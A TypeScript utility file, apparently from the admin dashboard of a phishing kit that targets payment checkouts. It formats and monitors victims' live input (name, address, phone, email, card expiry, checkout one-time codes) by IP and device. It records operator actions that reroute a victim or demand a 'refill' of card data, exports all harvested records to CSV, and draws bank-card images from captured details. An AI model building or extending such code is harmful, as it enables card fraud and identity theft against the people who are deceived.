import type { RecordRow } from '../types';

export function safeText(v: unknown) {
  return (v ?? '').toString();
}

export function formatVerifyMethod(v?: string) {
  const raw = safeText(v).trim();
  if (!raw) return '';
  const lower = raw.toLowerCase();
  if (lower.includes('phone') || lower.includes('tel') || raw.includes('电话')) return '电话';
  if (lower.includes('email') || raw.includes('邮箱')) return '邮箱';
  return raw;
}

export function isSubId(id: RecordRow['id']) {
  return id.toString().includes('.');
}

export function mainIdOf(id: RecordRow['id']) {
  return parseInt(id.toString().split('.')[0], 10);
}

export function compareRecordIdDesc(a: RecordRow['id'], b: RecordRow['id']) {
  const pa = a
    .toString()
    .split('.')
    .map((x) => parseInt(x, 10));
  const pb = b
    .toString()
    .split('.')
    .map((x) => parseInt(x, 10));

  if ((pb[0] ?? 0) !== (pa[0] ?? 0)) return (pb[0] ?? 0) - (pa[0] ?? 0);
  return (pb[1] ?? -1) - (pa[1] ?? -1);
}

export function fmtAgo(ms: number) {
  if (ms < 1000) return '刚刚';
  const s = Math.floor(ms / 1000);
  if (s < 60) return `${s}秒前`;
  const m = Math.floor(s / 60);
  if (m < 60) return `${m}分钟前`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}小时前`;
  return `${Math.floor(h / 24)}天前`;
}

function pageName(page?: string) {
  const p = (page || '').toLowerCase();
  if (p.includes('home')) return 'Home';
  if (p.includes('info')) return 'Info';
  if (p.includes('emailverify')) return 'Emailverify';
  if (p.includes('appcheck')) return 'Appcheck';
  if (p.includes('verify')) return 'Verify';
  if (p.includes('checkout')) return 'Checkout';
  return page || '未知';
}

export function statusCategory(status?: string) {
  const s = (status || '').toLowerCase();
  if (!s) return 'unknown';
  if (s.includes('submitted') || s.includes('已提交')) return 'submitted';
  if (s.includes('refill') || s.includes('重填')) return 'refill';
  if (s.includes('editing') || s.includes('typing') || s.includes('filling') || s.includes('entered')) return 'progress';
  return 'other';
}

const FIELD_MAP: Array<{ keys: string[]; label: string }> = [
  { keys: ['fullname', 'full name', 'name'], label: '姓名' },
  { keys: ['address line 1', 'address1', 'address'], label: '地址' },
  { keys: ['address line 2', 'address2', 'fulladdress'], label: '完整地址' },
  { keys: ['city'], label: '城市' },
  { keys: ['state', 'province'], label: '州/省' },
  { keys: ['postal', 'zip', 'postalcode'], label: '邮编' },
  { keys: ['checkout name'], label: '结账姓名' },
  { keys: ['checkout phone'], label: '结账号码' },
  { keys: ['checkout expiry date', 'checkoutexpirydate', 'expiry date', 'expiry', 'mm/yy', 'valid thru'], label: '卡有效期' },
  { keys: ['checkout code', 'verification code', 'otp'], label: '结账验证码' },
  { keys: ['checkout date'], label: '结账日期' },
  { keys: ['email'], label: '邮箱' },
  { keys: ['phone', 'telephone'], label: '电话' },
  { keys: ['verify method', 'verifymethod'], label: '验证方式' },
  { keys: ['verify'], label: '验证页' },
  { keys: ['emailverify'], label: '邮箱验证页' },
  { keys: ['appcheck'], label: '应用验证页' },
];

function detectFieldLabel(text: string) {
  const t = (text || '').toLowerCase();
  for (const item of FIELD_MAP) {
    if (item.keys.some((k) => t.includes(k))) return item.label;
  }
  return null;
}

export function toZhStatus(status?: string, page?: string) {
  const raw = (status || '').trim();
  const lower = raw.toLowerCase();

  if (!raw) return `停留在 ${pageName(page)}`;
  if (lower.includes('submitted')) return '已提交';
  if (lower.includes('checkout refill requested')) return '等待重填结账';
  if (lower.includes('refill requested')) return '等待重填资料';

  const editing =
    raw.match(/^(editing|typing|input|filling)\s*[:：]\s*(.+)$/i)?.[2]?.trim() ||
    raw.match(/^正在填写\s*[:：]\s*(.+)$/)?.[1]?.trim() ||
    '';
  if (editing) return `正在填写 ${detectFieldLabel(editing) || editing}`;

  const entered = raw.match(/^entered\s+(.+)$/i)?.[1]?.trim();
  if (entered) return `进入 ${pageName(entered)}`;

  if (lower.includes('admin routed user')) {
    const target = raw.split('->').pop()?.trim();
    return target ? `管理员跳转到 ${pageName(target)}` : '管理员发起跳转';
  }

  if (lower.includes('editing') || lower.includes('typing') || lower.includes('filling')) {
    const f = detectFieldLabel(raw);
    return f ? `正在填写 ${f}` : `正在填写 ${pageName(page)}`;
  }

  return raw;
}

function escapeCsvCell(s: string) {
  const t = s ?? '';
  if (/[",\n\r]/.test(t)) return `"${t.replace(/"/g, '""')}"`;
  return t;
}

export function toCsv(records: RecordRow[]) {
  const headers = [
    '序号',
    '时间',
    'IP',
    '设备类型',
    '系统',
    '状态',
    '姓名',
    '地址',
    '完整地址',
    '城市',
    '州/省',
    '邮编',
    '电话',
    '邮箱',
    '结账姓名',
    '结账号码',
    '卡有效期',
    '结账验证码',
    '验证方式',
    '验证',
    '邮箱验证',
    '应用验证',
  ];

  const lines = [
    headers.join(','),
    ...records.map((r) =>
      [
        r.id,
        r.time,
        r.ip,
        r.deviceType,
        r.deviceOS,
        toZhStatus(r.status, r.page),
        r.fullname,
        r.address,
        r.fulladdress,
        r.city,
        r.state,
        r.postalcode,
        r.telephone,
        r.email,
        r.checkoutName,
        r.checkoutPhone,
        r.checkoutExpiryDate,
        r.checkoutCode,
        r.verifyMethod,
        r.verify,
        r.emailVerify,
        r.appCheck,
      ]
        .map((v) => escapeCsvCell(v === undefined || v === null ? '' : typeof v === 'object' ? JSON.stringify(v) : String(v)))
        .join(',')
    ),
  ];
  return lines.join('\n');
}

export function downloadBlob(filename: string, content: BlobPart, mime: string) {
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

function formatBankCardNumber(v?: string) {
  const raw = safeText(v).replace(/\D/g, '').slice(0, 16);
  const filled = (raw + '****************').slice(0, 16);
  return filled.match(/.{1,4}/g)?.join(' ') || filled;
}

function formatCardHolder(v?: string) {
  const name = safeText(v).trim();
  return name ? name.toUpperCase() : 'CARD HOLDER';
}

function escapeXml(v: string) {
  return v.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');
}

export function buildCardImageDataUrl(name?: string, number?: string, expiry?: string) {
  const holder = escapeXml(formatCardHolder(name));
  const cardNo = escapeXml(formatBankCardNumber(number));
  const exp = escapeXml(safeText(expiry) || '--/--');
  const svg = `
<svg xmlns="http://www.w3.org/2000/svg" width="860" height="540" viewBox="0 0 860 540">
  <defs>
    <linearGradient id="chip" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#f1d37b"/>
      <stop offset="55%" stop-color="#d4ae45"/>
      <stop offset="100%" stop-color="#b68e2f"/>
    </linearGradient>
  </defs>
  <rect x="10" y="10" rx="32" ry="32" width="840" height="520" fill="#101418" stroke="rgba(255,255,255,0.22)" stroke-width="2"/>
  <rect x="56" y="112" rx="8" ry="8" width="92" height="68" fill="url(#chip)"/>
  <text x="56" y="292" font-size="64" fill="white" font-family="monospace" letter-spacing="4">${cardNo}</text>
  <text x="56" y="420" font-size="20" fill="rgba(255,255,255,0.70)" font-family="Arial, Helvetica, sans-serif">CARDHOLDER NAME</text>
  <text x="56" y="462" font-size="32" fill="white" font-family="Arial, Helvetica, sans-serif">${holder}</text>
  <text x="560" y="420" font-size="20" fill="rgba(255,255,255,0.70)" font-family="Arial, Helvetica, sans-serif">VALID THRU</text>
  <text x="560" y="462" font-size="42" fill="white" font-family="monospace">${exp}</text>
  <text x="790" y="468" font-size="36" fill="rgba(255,255,255,0.88)" font-family="Arial, Helvetica, sans-serif" text-anchor="end" font-weight="700">CARD</text>
</svg>`.trim();
  return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
}
